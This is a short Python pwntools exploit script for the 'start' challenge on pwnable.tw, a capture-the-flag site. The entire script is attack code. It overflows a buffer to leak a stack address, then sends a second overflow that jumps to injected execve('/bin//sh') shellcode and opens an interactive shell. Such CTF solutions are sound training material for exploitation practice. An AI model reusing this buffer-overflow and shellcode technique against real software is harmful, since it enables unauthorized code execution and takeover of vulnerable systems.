from pwn import *

#context.log_level = "debug"

#p = remote('chall.pwnable.tw', 10000)
p = process("./start")
e = ELF("./start")

# STEP1. LEAK STACK ADDRESS
payload = "A"*0x14 + p32(0x08048087)

p.recvuntil("Let's start the CTF:")
p.send(payload)

stack_addr = u32(p.recv(4))


sleep(0.2)


# STEP2. EXPLOIT!

shellcode = ""
shellcode += asm("xor eax, eax")
shellcode += asm("xor ebx, ebx")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p.send("B"*0x14 + p32(stack_addr+0x14) + shellcode)

p.interactive()

